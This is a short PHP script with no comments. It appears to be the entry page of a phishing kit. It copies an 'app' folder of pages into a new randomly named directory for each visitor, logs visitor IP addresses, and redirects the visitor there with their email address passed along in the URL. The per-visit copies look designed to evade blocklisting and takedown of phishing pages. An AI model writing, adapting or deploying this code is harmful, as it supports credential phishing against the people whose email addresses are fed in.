<?php
error_reporting(0);
session_start();
require_once 'esc/index.php';

$random = rand(0, 9000000);
$md5 = md5($random);
$base = base64_encode($md5);
$dst1 = md5($base) . $base;
$dst2 = substr($dst1, -9);
$dst = strtolower($dst2);
function recurse_copy($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if ($file != '.' && $file != '..') {
            if (is_dir($src . '/' . $file)) {
                recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}
$src = "app";
recurse_copy($src, $dst);
$ip = $_SERVER["REMOTE_ADDR"];
$file = fopen("logs.txt", "a");
fwrite($file, $ip . "  -  " . gmdate("Y-n-d") . "\n");

if (isset($_GET['email'])) {
    $zgetemail = $_GET['email'];
    header("location:" . $dst . "/index.php?email=$zgetemail");
} else {
    header("location:$dst");
}
